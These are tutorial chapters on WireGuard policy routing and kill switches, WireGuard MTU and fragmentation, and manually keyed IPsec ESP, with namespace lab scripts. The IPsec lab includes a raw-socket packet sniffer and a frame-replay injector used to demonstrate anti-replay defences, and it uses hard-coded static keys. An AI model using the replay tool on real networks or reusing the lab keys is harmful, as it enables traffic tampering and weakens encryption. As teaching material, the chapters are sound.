title: WireGuard Multi-Tunnel: AllowedIPs, Policy Routing, Kill Switch
text:
WireGuard Multi-Tunnel: AllowedIPs, Policy Routing, Kill Switch
The cryptokey-routing chapter showed one tunnel and one peer. Real laptops and edge routers often run several WireGuard interfaces at once: a full-tunnel VPN to work, a split-tunnel to a lab, maybe a site-to-site mesh peer. The hard part is not key exchange. It is who owns 0.0.0.0/0, how policy routing and fwmarks keep ciphertext off the wrong table, and how a kill switch (which is not a WireGuard feature) drops plaintext when the tunnel is down.
This chapter makes those three ideas concrete. Lab notes use Debian 13 ideas and wireguard-tools v1.0.20210914 as found on this host; privileged ip netns drills need root and are shown as scripts you run on a disposable machine. No packages are installed in the scout sandbox.

title: WireGuard Multi-Tunnel: AllowedIPs, Policy Routing, Kill Switch
text:
Learning goals
By the end of this chapter you can:

Explain why two peers both listing AllowedIPs = 0.0.0.0/0 cannot share one routing story without policy routing
Set fwmark on a WireGuard interface and steer plaintext with ip rule / extra tables (the wg-quick pattern)
Sketch a kill switch as filter rules that drop non-marked traffic, not as a WireGuard knob
Know when network namespaces (wireguard.com/netns) beat classic route hacks

title: WireGuard Multi-Tunnel: AllowedIPs, Policy Routing, Kill Switch
text:
Concepts in one page
  App traffic (no mark) ──► ip rule: lookup table 2468 ──► default dev wg0
  wg0 UDP ciphertext     ──► socket marked fwmark 1234 ──► main table / ISP

  Second tunnel wg1 with its own mark + table
  ──► rules choose table by mark, uid, or fwmark from cgroup/VRF







Piece
Job




AllowedIPs
Cryptokey routing: outbound peer selection and inbound source filter


Kernel route to wg0
Only gets the packet onto the interface


wg set … fwmark
Marks WireGuard’s own UDP so policy routing can exempt it from the tunnel default


ip rule + custom table
Sends unmarked (or otherwise classified) traffic into the tunnel table


Kill switch
Firewall (iptables/nftables) drop of traffic that is neither local nor marked for a live tunnel


Netns physical/init split
Alternative full-tunnel design from the WireGuard site — ciphertext socket stays in the “physical” namespace

title: WireGuard Multi-Tunnel: AllowedIPs, Policy Routing, Kill Switch
text:
Worked examples

Case 1: Two tunnels, one default — the collision
# Bad idea on one host without policy routing:
# /etc/wireguard/wg0.conf  (work VPN)
[Peer]
AllowedIPs = 0.0.0.0/0, ::/0

# /etc/wireguard/wg1.conf  (personal VPN)
[Peer]
AllowedIPs = 0.0.0.0/0, ::/0
Both interfaces claim the entire Internet in cryptokey routing and (via wg-quick) typically install default routes. Whichever wg-quick up ran last wins the default route; the other peer’s AllowedIPs still claim destinations they will never see. Symptoms: “VPN is up” in wg show but traffic leaks to the wrong peer or blackholes.
Boring fix: at most one peer on a host with 0.0.0.0/0. Other tunnels get split prefixes (10.0.0.0/8, 192.0.2.0/24, …). If you truly need two full tunnels, separate them with namespaces, VRFs, or per-uid / per-mark policy routing — not two defaults in main.


Case 2: fwmark + policy routing (single full tunnel)
This is the improved rule-based pattern from Routing & Network Namespaces — the same idea wg-quick uses:
#!/usr/bin/env bash
# wg-policy-up.sh — docs-faithful sketch (needs root; not run in scout sandbox)
set -euo pipefail
# Assume wg0 already has keys/peers; we only add routing policy.
wg set wg0 fwmark 1234
ip route add default dev wg0 table 2468
ip rule add not fwmark 1234 table 2468
ip rule add table main suppress_prefixlength 0







Step
Meaning




fwmark 1234 on wg0
Ciphertext UDP from WireGuard carries mark 1234


default dev wg0 table 2468
Tunnel table sends everything into wg0


not fwmark 1234 table 2468
Plaintext (unmarked) uses the tunnel table


suppress_prefixlength 0
Still allow non-default routes from main (LAN) for unmarked packets



Without the mark exemption, tunnel ciphertext would be routed back into wg0 (routing loop). With it, only application traffic takes the tunnel default.
# Tear-down sketch
ip rule del not fwmark 1234 table 2468 2>/dev/null || true
ip rule del table main suppress_prefixlength 0 2>/dev/null || true
ip route flush table 2468 2>/dev/null || true
wg set wg0 fwmark 0
Verification on this scout host: commands were not executed with root. On a lab VM, wg show wg0 should list fwmark: 0x4d2, and ip rule should show the two policy lines.


Case 3: Multi-tunnel with distinct marks
  wg0 (work)   fwmark 0x10   table 100   rule: from all fwmark 0x10 lookup 100
  wg1 (lab)    fwmark 0x20   table 200   rule: from all fwmark 0x20 lookup 200

  Mark traffic deliberately:
    - systemd: IPAccounting / socket marking via nft / cgroup classifiers
    - "work browser" runs under a unit that sets mark 0x10
    - default unmarked traffic: either ISP (no kill switch) or drop (kill switch)
# Sketch — two tunnel tables (root; not run here)
wg set wg0 fwmark 16
wg set wg1 fwmark 32
ip route add default dev wg0 table 100
ip route add default dev wg1 table 200
ip rule add fwmark 16 table 100
ip rule add fwmark 32 table 200
# Exempt each interface's own ciphertext from its tunnel table using
# "not fwmark <that-iface-mark>" rules, same idea as Case 2.
AllowedIPs on each peer should match the prefixes you actually send into that interface. A work VPN peer might get 0.0.0.0/0 inside table 100 only; a lab peer gets 10.50.0.0/16 only.


Case 4: Kill switch = firewall, not WireGuard
WireGuard has no KillSwitch=true. Operators implement “if the tunnel is down, do not leak” with packet filters:
# nftables sketch — drop forwarded/output traffic not marked for a tunnel
# (illustrative; tighten to your iface list and local subnets before use)
nft add table inet killswitch
nft add chain inet killswitch output '{ type filter hook output priority 0; policy drop; }'
nft add rule  inet killswitch output meta mark 16 accept   # work tunnel mark
nft add rule  inet killswitch output meta mark 32 accept   # lab tunnel mark
nft add rule  inet killswitch output oifname "lo" accept
nft add rule  inet killswitch output ip daddr 192.168.0.0/16 accept  # example LAN
# cipher path: accept UDP to known endpoints OR accept mark that wg sets on socket
When wg0 goes down, marks never get applied by your classifier → output drops → no ISP leak. Mis-write the LAN exceptions and you lock yourself out of SSH; test on console.


Case 5: Namespace alternative for “all traffic through one tunnel”
From the official netns guide: move eth0 into a physical namespace, birth wg0 there, move wg0 to init, default-route init through wg0. Ciphertext UDP stays in physical; ordinary processes never see eth0. That design avoids half of the main-table fights and is often cleaner than multiple full tunnels in one namespace. Multiple simultaneous full tunnels still want marks, VRFs, or separate netns per tunnel.

title: WireGuard Multi-Tunnel: AllowedIPs, Policy Routing, Kill Switch
text:
The trap

Two AllowedIPs = 0.0.0.0/0 peers without separate policy domains.
Forgetting fwmark exemption → mysterious loss of handshake (ciphertext sucked into the tunnel route).
Calling wg-quick “the kill switch” — SaveConfig / Table= help routing; leak prevention is firewall policy.
Skipping endpoint / LAN exceptions and bricking remote admin access.
Treating X marketing (“multi-tunnel + kill switch”) as WireGuard core features — they are operator composition on top of cryptokey routing.

title: WireGuard Multi-Tunnel: AllowedIPs, Policy Routing, Kill Switch
text:
The boring rule
One default owner per routing domain; mark ciphertext; steer plaintext with ip rule; implement kill switches in nftables/iptables; prefer netns when the whole host should only speak through one tunnel.

title: WireGuard Multi-Tunnel: AllowedIPs, Policy Routing, Kill Switch

On a disposable VM, bring up one wg-quick full tunnel and wg show / ip rule / ip route show table all to see marks and tables.
Add a second split-tunnel interface with a narrow AllowedIPs and ping across both.
Implement a minimal nft output drop policy and prove that stopping wg-quick blocks IPv4 to 1.1.1.1 while LAN still works.

text: WireGuard and MTU: Where the 1420 Comes From, Padding, and Silent Fragmentation

title: WireGuard and MTU: Where the 1420 Comes From, Padding, and Silent Fragmentation
text:
Learning goals

Derive WireGuard’s default MTU of 1420 from the kernel source, and know why it is 80 bytes and not 60.
Measure the real outer packet size for a given inner packet, including WireGuard’s 16-byte padding, on a live kernel tunnel.
See what Linux WireGuard does when the underlay shrinks below what wg0 assumes. It sends outer IPv4 with DF=0, so the packets are fragmented instead of dropped, and you need to know when that rescue stops working.
Size wg0 for a smaller underlay and prove the result with a DF probe.

Version note: everything below ran on Linux 6.12 (the in-tree wireguard module) inside an unprivileged user and network namespace (unshare -rn): no sudo, no wg tool and no ping on the box. Keys were set over netlink with pyroute2 0.9.7 (in a /workspace venv), packets were captured with an AF_PACKET socket in Python, and the underlay is a veth pair between two network namespaces. Kernel citations are to drivers/net/wireguard/ at tag v6.12. The output is pasted from the run.



WireGuard MTU arithmetic and what happens when the underlay shrinks.

title: WireGuard and MTU: Where the 1420 Comes From, Padding, and Silent Fragmentation
text:
Where 1420 comes from
From drivers/net/wireguard/device.c (v6.12):
const int overhead = MESSAGE_MINIMUM_LENGTH + sizeof(struct udphdr) +
                     max(sizeof(struct ipv6hdr), sizeof(struct iphdr));
...
dev->mtu = ETH_DATA_LEN - overhead;
MESSAGE_MINIMUM_LENGTH is the data-message framing: a 16-byte header (type, receiver index and counter) plus the 16-byte Poly1305 tag, 32 bytes in all. Add the 8-byte UDP header and the larger of the two IP headers (40 for IPv6) and you get 80, so 1500 − 80 = 1420. Over an IPv4 underlay the real overhead is 60, which leaves 20 bytes of slack. Over IPv6 it is exactly 80.
The plaintext is also padded. send.c’s calculate_skb_padding() aligns it to MESSAGE_PADDING_MULTIPLE (16) but clamps it to the interface MTU, so a full-size packet is never pushed over the MTU. The WireGuard paper describes the padding in §5.4.6.

title: WireGuard and MTU: Where the 1420 Comes From, Padding, and Silent Fragmentation
section: Lab: a real tunnel between two namespaces
text:
Lab: a real tunnel between two namespaces
#!/bin/sh
# Run as: unshare -rn ./lab.sh   (unprivileged: user + net namespace, no sudo)
set -e
PY=/workspace/venv-qos/bin/python
unshare -n sleep 60 >/dev/null 2>&1 & B=$!; sleep 0.2
inB() { nsenter -t $B -n --preserve-credentials "$@"; }
ip link set lo up; inB ip link set lo up
ip link add vA type veth peer name vB; ip link set vB netns /proc/$B/ns/net
ip addr add 192.0.2.1/24 dev vA; ip link set vA up
inB ip addr add 192.0.2.2/24 dev vB; inB ip link set vB up
ip link add wg0 type wireguard; inB ip link add wg0 type wireguard
$PY wgset.py wg0 a.key b.pub 51820 192.0.2.2 51820 10.9.0.2/32
inB $PY wgset.py wg0 b.key a.pub 51820 192.0.2.1 51820 10.9.0.1/32
ip addr add 10.9.0.1/24 dev wg0; ip link set wg0 up
inB ip addr add 10.9.0.2/24 dev wg0; inB ip link set wg0 up
echo "== links"; ip -o link show vA | awk '{print "   "$2, $4, $5}'; ip -o link show wg0 | awk '{print "   "$2, $4, $5}'
inB python3 cap.py vB 8 & C=$!; sleep 0.3
step() { echo "-- $1"; shift; python3 send.py 10.9.0.2 "$@"; sleep 0.3; }
step "first packet triggers the handshake" 0
step "inner sizes vs outer IPv4 packet size (underlay MTU 1500)" 0 1 15 16 17 1392
step "DF probe through wg0 (MTU 1420)" 1393
ip link set vA mtu 1400; inB ip link set vB mtu 1400
step "underlay shrinks to 1400, wg0 left at 1420: inner 1420-byte packet" 1392
ip link set wg0 mtu 1340
step "fix: wg0 MTU 1340 (= 1400 - 60)" 1312 1313
wait $C; kill $B
Helpers: wgset.py sets keys and the peer over netlink, send.py sends UDP datagrams with DF set, and cap.py prints every IPv4 frame arriving on the far end of the underlay.
# wgset.py IFNAME PRIVFILE PEERPUBFILE LISTENPORT PEER_ENDPOINT_IP PEER_PORT PEER_ALLOWED
import sys
from pyroute2 import WireGuard
ifn, priv, peer, lport, eip, eport, allowed = sys.argv[1:]
WireGuard().set(ifn, private_key=open(priv).read().strip(), listen_port=int(lport),
    peer={"public_key": open(peer).read().strip(), "endpoint_addr": eip,
          "endpoint_port": int(eport), "allowed_ips": [allowed]})
# send.py DST SIZE...: send one UDP datagram per SIZE with DF set (IP_PMTUDISC_DO)
import socket, sys
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.IPPROTO_IP, 10, 2)  # IP_MTU_DISCOVER, IP_PMTUDISC_DO (linux/in.h)
for n in map(int, sys.argv[2:]):
    try:
        s.sendto(b"x" * n, (sys.argv[1], 9)); print(f"   payload {n:5d} (IP {n+28:5d}): sent")
    except OSError as e:
        print(f"   payload {n:5d} (IP {n+28:5d}): {e.strerror}")
# cap.py IFACE SECONDS: print every IPv4 frame received on IFACE (AF_PACKET, no tcpdump)
import socket, struct, sys, time
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
s.bind((sys.argv[1], 0)); s.settimeout(0.2)
end = time.time() + float(sys.argv[2])
KIND = {1: "handshake-init", 2: "handshake-resp", 3: "cookie", 4: "data"}
while time.time() < end:
    try: f, addr = s.recvfrom(65535)
    except socket.timeout: continue
    if addr[2] == socket.PACKET_OUTGOING: continue
    ip = f[14:]; tot, = struct.unpack("!H", ip[2:4]); fl, = struct.unpack("!H", ip[6:8])
    df, mf, off = fl >> 14 & 1, fl >> 13 & 1, (fl & 0x1fff) * 8
    what = ""
    if ip[9] == 17 and off == 0:
        udp = ip[20:]; what = KIND.get(udp[8], "?")
        if what == "data" and not mf: what += f" (encrypted inner packet {tot - 20 - 8 - 32} B incl. padding)"
        elif what == "data": what += " (first fragment)"
    elif off: what = "(later fragment)"
    print(f"      rx IP {tot:5d}  DF={df} MF={mf} off={off:<5d} {what}", flush=True)
The keys a.key/b.key and a.pub/b.pub are fresh X25519 keys, generated with Python cryptography and base64-encoded, which is the same format as wg genkey/wg pubkey.
$ unshare -rn ./lab.sh
== links
   vA@if2: mtu 1500
   wg0: mtu 1420
-- first packet triggers the handshake
   payload     0 (IP    28): sent
      rx IP   176  DF=0 MF=0 off=0     handshake-init
      rx IP    92  DF=0 MF=0 off=0     data (encrypted inner packet 32 B incl. padding)
-- inner sizes vs outer IPv4 packet size (underlay MTU 1500)
   payload     0 (IP    28): sent
   payload     1 (IP    29): sent
   payload    15 (IP    43): sent
   payload    16 (IP    44): sent
   payload    17 (IP    45): sent
   payload  1392 (IP  1420): sent
      rx IP    92  DF=0 MF=0 off=0     data (encrypted inner packet 32 B incl. padding)
      rx IP    92  DF=0 MF=0 off=0     data (encrypted inner packet 32 B incl. padding)
      rx IP   108  DF=0 MF=0 off=0     data (encrypted inner packet 48 B incl. padding)
      rx IP   108  DF=0 MF=0 off=0     data (encrypted inner packet 48 B incl. padding)
      rx IP   108  DF=0 MF=0 off=0     data (encrypted inner packet 48 B incl. padding)
      rx IP  1480  DF=0 MF=0 off=0     data (encrypted inner packet 1420 B incl. padding)
-- DF probe through wg0 (MTU 1420)
   payload  1393 (IP  1421): Message too long
-- underlay shrinks to 1400, wg0 left at 1420: inner 1420-byte packet
   payload  1392 (IP  1420): sent
      rx IP  1396  DF=0 MF=1 off=0     data (first fragment)
      rx IP   104  DF=0 MF=0 off=1376  (later fragment)
-- fix: wg0 MTU 1340 (= 1400 - 60)
   payload  1312 (IP  1340): sent
   payload  1313 (IP  1341): Message too long
      rx IP  1400  DF=0 MF=0 off=0     data (encrypted inner packet 1340 B incl. padding)
The capture only shows packets arriving at B, so the handshake response (B → A) is not listed.

title: WireGuard and MTU: Where the 1420 Comes From, Padding, and Silent Fragmentation
text:
Reading the numbers



Inner IP packet
Padded plaintext
Outer IPv4 packet
Overhead




28
32
92
64


29
32
92
63


43 / 44 / 45
48
108
65 / 64 / 63


1420
1420 (clamped, not 1424)
1480
60




Fixed overhead is 60 bytes on IPv4, plus up to 15 bytes of padding. The padding means small packets cost slightly more. At full size it costs nothing, because padding is clamped to the MTU: 1420 is not a multiple of 16, and yet the outer packet is exactly 1480.
The DF probe (IP_PMTUDISC_DO, the socket equivalent of ping -M do) shows the inner limit: 1392 bytes of UDP payload (1420 IP) is sent, and 1393 gets EMSGSIZE locally.
When the underlay shrinks to 1400, wg0 still believes in 1420, and the encrypted 1480-byte packet leaves as two IPv4 fragments, 1396 + 104, with DF=0. It arrives. That is no accident: socket.c sets skb->ignore_df = 1 and passes df = 0 to udp_tunnel_xmit_skb(). A Linux WireGuard sender lets an IPv4 underlay fragment rather than drop.
After the fix (wg0 MTU 1340 = 1400 − 60), a 1340-byte inner packet becomes exactly one 1400-byte outer packet with no fragments, and anything larger fails fast at the sender.

title: WireGuard and MTU: Where the 1420 Comes From, Padding, and Silent Fragmentation
section: When fragmentation stops saving you (not run here)
text:
When fragmentation stops saving you (not run here)
The fragment rescue in the lab worked because the box doing the fragmenting was the sender, and IPv4 allows any router to fragment a DF=0 packet. It stops working when:

The underlay is IPv6. IPv6 routers never fragment (RFC 8200 §5), so an oversized outer packet in the middle of the path is dropped. The sender learns about it only from ICMPv6 Packet Too Big, if that arrives.
Something on the path drops fragments. Firewalls, some cloud load balancers and NAT devices do. RFC 8900 catalogues why IP fragmentation is fragile.
The fragments survive but cost you. Every full-size packet becomes two, and losing either one loses both. Throughput drops and loss amplifies even though “it works”.

In all three cases the symptom is the classic one: handshakes and small pings work, and bulk TCP stalls.

title: WireGuard and MTU: Where the 1420 Comes From, Padding, and Silent Fragmentation
text:
The boring rule

Default 1420 is right when the underlay MTU is 1500, over either IP family.
Smaller underlay (PPPoE 1492, another tunnel, a cloud VPC with odd MTUs): set wg0 MTU = underlay MTU − 80. Use − 60 only if the underlay is IPv4-only and will stay that way.
Prove it with a DF probe at the tunnel MTU through the tunnel, not with a default-size ping.
TCP clamping: if you cannot control every host’s MTU, clamp TCP MSS on the tunnel gateway (nftables tcp option maxseg size set rt mtu).

title: WireGuard and MTU: Where the 1420 Comes From, Padding, and Silent Fragmentation
text:
Try this

Move the underlay to IPv6 (2001:db8::1/64 on the veths, endpoints in IPv6) and repeat the shrink step. Does the outer packet still go out as fragments from the sender? Do the sizes change by 20 bytes?
Set wg0 MTU to 1424 (a multiple of 16) and send a 1424-byte inner packet. What does the clamp do now?
Measure throughput with and without fragmentation using a 10-second UDP blast from send.py and the rx counters in /proc/net/dev.

title: IPsec by Hand: ESP with ip xfrm, and What IKEv2 Automates
text: IPsec by Hand: ESP with ip xfrm, and What IKEv2 Automates

title: IPsec by Hand: ESP with ip xfrm, and What IKEv2 Automates
text:
Learning goals

Name the two kernel tables behind every Linux IPsec tunnel, the SPD (policies) and the SAD (states), and say which one decides whether a packet is protected and which one decides how
Build a manually keyed ESP tunnel between two namespaces with ip xfrm, and see on the wire that the inner packet is gone
Account for every byte of ESP tunnel overhead, from outer IP header to ICV
Read the anti-replay window and the /proc/net/xfrm_stat counters when packets disappear
Explain what IKEv2 adds on top (authentication, key exchange, rekeying, NAT traversal, dead peer detection) and where post-quantum key exchange fits

title: IPsec by Hand: ESP with ip xfrm, and What IKEv2 Automates
text:
Thesis
IPsec looks hard because its configuration files are long, but the data plane is small. The kernel keeps two tables. The Security Policy Database says “traffic from this prefix to that prefix must be ESP-protected, through this tunnel”. The Security Association Database holds the keys, the SPI and the counters for each direction. If a packet matches a policy and an SA exists, the kernel encrypts it. If a packet arrives that a policy says should have been protected but was not, the kernel drops it. That is all ESP is. IKEv2, which strongSwan or Libreswan run, is a control plane that authenticates the peers and writes those two tables for you, then rewrites them before the keys get old. Learn the tables first. Then every IKE log line maps onto a row you have already seen.

title: IPsec by Hand: ESP with ip xfrm, and What IKEv2 Automates
text:
Mental model
  left namespace                                        right namespace
  172.16.1.1 (lo)                                        172.16.2.1 (lo)
       |                                                        ^
       v                                                        |
  [ SPD: dir out ]  src 172.16.1.0/24 dst 172.16.2.0/24   [ SPD: dir in ]
  "must be ESP, tunnel 10.0.0.1 -> 10.0.0.2, reqid 1"     "must have arrived as ESP"
       |                                                        ^
       v                                                        |
  [ SAD ] spi 0x1001, AES-GCM key, seq++               [ SAD ] spi 0x1001, same key,
       |                                                  replay window, ICV check
       v                                                        |
  wan-l 10.0.0.1  ======  outer IP proto 50 (ESP)  ======>  wan-r 10.0.0.2

  One SA per direction: 0x1001 carries left -> right, 0x2001 carries right -> left.

title: IPsec by Hand: ESP with ip xfrm, and What IKEv2 Automates
text:
The two tables

Policies (SPD)
A policy is a selector plus an action. The selector is usually a source prefix, a destination prefix and optionally a protocol and ports. The action is a template: “protect with ESP, tunnel mode, from this outer address to that outer address, using an SA with reqid 1”. Linux has three directions:








Direction
Checked when
Typical use




out
a locally sent or forwarded packet is about to leave
encrypt traffic to the far site


in
a packet is delivered to this host after decapsulation
insist that traffic from the far site arrived protected


fwd
a decapsulated packet is about to be forwarded
the same check, for a gateway that routes to a LAN behind it



The lab tunnels between addresses owned by the two namespaces, so it needs out and in. A real site-to-site gateway that forwards to a LAN also needs fwd policies. strongSwan installs all three for you.


States (SAD)
An SA is one direction of one tunnel. It is identified by the triple (destination address, protocol, SPI). The SPI is the 32-bit number at the start of every ESP packet. It tells the receiver which key to use. The SA holds:

the algorithm and key (here AES-GCM-128 as rfc4106(gcm(aes)), with a 16-byte key and a 4-byte salt, which is why the key is 20 bytes)
the mode (tunnel wraps the whole inner IP packet; transport protects only the payload of host-to-host traffic)
the sequence counter for sending and the anti-replay window for receiving
lifetimes in seconds, bytes and packets. Manually keyed SAs have none. IKE uses them to trigger rekeying.

A policy points at an SA through the template (addresses, protocol, mode, reqid). If a policy matches but no SA exists, the kernel cannot send the packet. With IKE running, that is the moment the kernel asks the daemon to negotiate one (“acquire”).


Route-based vs policy-based, once more
The site-tunnels chapter introduced the distinction. With bare policies, as in this lab, the SPD steers traffic: routing only has to get the packet to the right egress, and the policy catches it there. With a route-based design, you create an XFRM interface (ip link add ipsec0 type xfrm if_id 7) or a VTI. Policies match “everything with if_id 7”, and the routing table decides what enters the tunnel. Route-based is easier to combine with OSPF or BGP over the tunnel. The SA and the bytes on the wire are identical either way.

title: IPsec by Hand: ESP with ip xfrm, and What IKEv2 Automates
text:
ESP on the wire
RFC 4303 defines the packet. In tunnel mode with AES-GCM (RFC 4106) it is:
+-----------------+----------+----------+--------+----------------------------+------------------+--------+
| outer IPv4 (20) | SPI (4)  | Seq (4)  | IV (8) | inner IP packet, encrypted | pad + padlen + NH| ICV(16)|
+-----------------+----------+----------+--------+----------------------------+------------------+--------+
                  |<---- ESP header ---->|        |<----------- encrypted -------------------->|
                  |<-------------------------- authenticated by GCM ------------------------------------>|

SPI and sequence number travel in clear. Anyone on the path can see which SA a packet belongs to and count packets.
The IV must never repeat under one key. Linux’s seqiv generator derives it from the sequence number, so it is unique without being random. You will see that in the lab output.
The trailer is padding, a pad-length byte and a next-header byte (4 for IPv4-in-tunnel). The encrypted part must end on a 4-byte boundary.
The ICV is the GCM tag. If one bit of the packet changes, or the key is wrong, the ICV check fails and the packet is dropped. The sender gets no error.

title: IPsec by Hand: ESP with ip xfrm, and What IKEv2 Automates
section: Lab: two namespaces, one manually keyed ESP tunnel
text:
Lab: two namespaces, one manually keyed ESP tunnel
This lab runs as an ordinary user. unshare -urnm creates a private user, network and mount namespace in which you are root, so ip netns, ip xfrm and raw sockets work without sudo. The host is not touched. The box has no ping and no tcpdump, so three tiny Python helpers stand in for them: ping.py sends ICMP echoes from a chosen source address, sniff.py prints one line per IPv4 packet arriving on an interface (using an AF_PACKET socket, like tcpdump), and inject.py re-sends a captured frame to stage a replay.
Manual keys are for learning only. Never run production IPsec with static keys: there is no rekeying, so a long-lived key and a sequence counter that never resets are exactly what ESP is designed to avoid.
lab.sh:
#!/bin/sh
# Run as: unshare -urnm sh lab.sh
# Two namespaces, one veth "Internet" between them, and a manually keyed
# IPsec ESP tunnel (ip xfrm) protecting 172.16.1.0/24 <-> 172.16.2.0/24.
set -e
mount -t tmpfs tmpfs /run; mkdir -p /run/netns
ip netns add left; ip netns add right
ip link add wan-l type veth peer name wan-r
ip link set wan-l netns left; ip link set wan-r netns right
L="ip netns exec left"; R="ip netns exec right"
for ns in left right; do ip -n $ns link set lo up; done
ip -n left  addr add 10.0.0.1/24 dev wan-l; ip -n left  link set wan-l up
ip -n right addr add 10.0.0.2/24 dev wan-r; ip -n right link set wan-r up
ip -n left  addr add 172.16.1.1/32 dev lo
ip -n right addr add 172.16.2.1/32 dev lo
ip -n left  route add 172.16.2.0/24 via 10.0.0.2 src 172.16.1.1
ip -n right route add 172.16.1.0/24 via 10.0.0.1 src 172.16.2.1
SNIFF="python3 $(pwd)/sniff.py"
stat() { $R awk -v want="$1" '$1 ~ want && $2 != 0 {printf "   right %s %s\n", $1, $2}' /proc/net/xfrm_stat; }
pingit() { $L python3 $(pwd)/ping.py 172.16.1.1 172.16.2.1 "$1" "${2:-56}" | sed "s/^/   /"; }

echo "== 1. no IPsec: what the Internet link carries"
$R $SNIFF wan-r 1.5 & sleep 0.3; pingit 2; wait

# One SA per direction. AES-GCM-128 via rfc4106: 16-byte key + 4-byte salt.
K_LR=0x$(printf '11%.0s' $(seq 20)); K_RL=0x$(printf '22%.0s' $(seq 20))
sa() { # ns src dst spi key
  ip -n $1 xfrm state add src $2 dst $3 proto esp spi $4 reqid 1 mode tunnel \
     replay-window 32 aead 'rfc4106(gcm(aes))' $5 128; }
for ns in left right; do
  sa $ns 10.0.0.1 10.0.0.2 0x1001 $K_LR
  sa $ns 10.0.0.2 10.0.0.1 0x2001 $K_RL
done
pol() { # ns dir src-net dst-net tunnel-src tunnel-dst
  ip -n $1 xfrm policy add dir $2 src $3 dst $4 \
     tmpl src $5 dst $6 proto esp reqid 1 mode tunnel; }
pol left  out 172.16.1.0/24 172.16.2.0/24 10.0.0.1 10.0.0.2
pol left  in  172.16.2.0/24 172.16.1.0/24 10.0.0.2 10.0.0.1
pol right out 172.16.2.0/24 172.16.1.0/24 10.0.0.2 10.0.0.1
pol right in  172.16.1.0/24 172.16.2.0/24 10.0.0.1 10.0.0.2

echo "== 2. ESP tunnel up: same ping, now encrypted"
$R $SNIFF wan-r 1.5 /tmp/esp-frame.bin & sleep 0.3; pingit 2; wait
echo "-- right: ip -s xfrm state (inbound SA)"
$R ip -s xfrm state get src 10.0.0.1 dst 10.0.0.2 proto esp spi 0x1001 | sed 's/^/   /'

echo "== 3. overhead: inner 1000-byte ping"
$R $SNIFF wan-r 1.0 & sleep 0.3; pingit 1 972; wait

echo "== 4. replay a captured ESP packet 3 times"
$L python3 $(pwd)/inject.py wan-l /tmp/esp-frame.bin 3; sleep 0.3; stat 'XfrmInStateSeqError'

echo "== 5. wrong key on right's inbound SA"
K_BAD=0x$(printf '33%.0s' $(seq 20))
$R ip xfrm state update src 10.0.0.1 dst 10.0.0.2 proto esp spi 0x1001 reqid 1 \
   mode tunnel replay-window 32 aead 'rfc4106(gcm(aes))' $K_BAD 128
echo "-- after 'state update' with the bad key, the SA still holds:"
$R ip xfrm state get src 10.0.0.1 dst 10.0.0.2 proto esp spi 0x1001 | grep aead | sed 's/^\s*/   /'
pingit 2
echo "-- delete + add with the bad key instead"
ip -n right xfrm state delete src 10.0.0.1 dst 10.0.0.2 proto esp spi 0x1001
sa right 10.0.0.1 10.0.0.2 0x1001 $K_BAD
pingit 2; stat 'XfrmInStateProtoError'
ip -n right xfrm state delete src 10.0.0.1 dst 10.0.0.2 proto esp spi 0x1001
sa right 10.0.0.1 10.0.0.2 0x1001 $K_LR
echo "-- good key restored"
pingit 2

echo "== 6. left 'forgets' its out policy: plaintext reaches right"
ip -n left xfrm policy delete dir out src 172.16.1.0/24 dst 172.16.2.0/24
$R $SNIFF wan-r 1.0 & sleep 0.3; pingit 1; wait; stat 'XfrmInTmplMismatch'
echo "-- right without an 'in' policy"
ip -n right xfrm policy delete dir in src 172.16.1.0/24 dst 172.16.2.0/24
pingit 2
ping.py:
#!/usr/bin/env python3
"""Minimal ICMP echo (this box has no ping binary). usage: ping.py SRC DST COUNT [SIZE]"""
import os, socket, struct, sys, time
src, dst, count = sys.argv[1], sys.argv[2], int(sys.argv[3])
size = int(sys.argv[4]) if len(sys.argv) > 4 else 56
def csum(b):
    b += b"\0" * (len(b) & 1)
    s = sum(struct.unpack(f"!{len(b)//2}H", b)); s = (s >> 16) + (s & 0xffff); s += s >> 16
    return ~s & 0xffff
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
s.bind((src, 0)); s.settimeout(1.0)
ok, ident = 0, os.getpid() & 0xffff
for seq in range(1, count + 1):
    payload = bytes(range(256)) * (size // 256 + 1)
    payload = payload[:size]
    hdr = struct.pack("!BBHHH", 8, 0, 0, ident, seq)
    pkt = struct.pack("!BBHHH", 8, 0, csum(hdr + payload), ident, seq) + payload
    s.sendto(pkt, (dst, 0))
    try:
        while True:
            r = s.recv(65535)
            if r[20] == 0 and struct.unpack("!HH", r[24:28]) == (ident, seq):
                ok += 1; break
    except socket.timeout:
        pass
    time.sleep(0.2)
print(f"{count} sent, {ok} replies ({src} -> {dst}, {size}-byte payload)")
sniff.py:
#!/usr/bin/env python3
"""Print one line per IPv4 packet seen on an interface (AF_PACKET, no tcpdump).

usage: sniff.py IFACE SECONDS [save-first-esp-to-file]
"""
import socket, struct, sys, time
iface, secs = sys.argv[1], float(sys.argv[2])
save = sys.argv[3] if len(sys.argv) > 3 else None
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
s.bind((iface, 0)); s.settimeout(0.2)
end, saved = time.time() + secs, False
names = {1: "ICMP", 6: "TCP", 17: "UDP", 50: "ESP"}
while time.time() < end:
    try:
        frame, addr = s.recvfrom(65535)
    except socket.timeout:
        continue
    if addr[2] == socket.PACKET_OUTGOING:
        continue  # only what arrives on this side
    ip = frame[14:]
    tot, proto = struct.unpack("!H", ip[2:4])[0], ip[9]
    src, dst = socket.inet_ntoa(ip[12:16]), socket.inet_ntoa(ip[16:20])
    line = f"{src:>11} > {dst:<11} {names.get(proto, proto):4} len={tot}"
    if proto == 50:
        spi, seq = struct.unpack("!II", ip[20:28])
        line += f"  spi=0x{spi:08x} seq={seq}  payload-head={ip[28:36].hex()}"
        if save and not saved:
            open(save, "wb").write(frame); saved = True
    elif proto == 1:
        line += f"  icmp type={ip[20]} payload-head={ip[28:36].hex()}"
    print(line, flush=True)
inject.py:
#!/usr/bin/env python3
"""Re-send a saved Ethernet frame on IFACE, unchanged (a replay)."""
import socket, sys
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind((sys.argv[1], 0))
frame = open(sys.argv[2], "rb").read()
for _ in range(int(sys.argv[3])):
    s.send(frame)
print(f"replayed {sys.argv[3]} copies of a {len(frame)}-byte frame on {sys.argv[1]}")
Run it:
unshare -urnm sh lab.sh
Output:
== 1. no IPsec: what the Internet link carries

